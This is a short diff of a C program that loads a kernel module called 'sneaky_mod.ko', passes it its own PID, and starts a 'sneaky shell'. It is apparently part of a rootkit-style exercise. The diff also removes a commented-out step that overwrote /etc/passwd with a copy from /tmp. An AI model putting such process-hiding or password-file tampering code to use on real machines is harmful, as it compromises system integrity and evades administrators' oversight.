@@ -69,7 +69,7 @@ int main(int argc, char* argv[]){
     exit(EXIT_FAILURE);
   }
 
-  char * command = "insmod sneaky_mod.ko ";
+  char * command = "insmod sneaky_mod.ko pid=";
   int pid = getpid();
   loadModule(command, pid);
   printf("start sneaky shell\n");
@@ -86,11 +86,5 @@ int main(int argc, char* argv[]){
       break;
     }
   }
-  /*
-  if(copyFile("/tmp/passwd", "/etc/passwd") != 0){
-    printf("Failed to copy file \n");
-    exit(EXIT_FAILURE);
-  }
-  */
   return 0;
 }
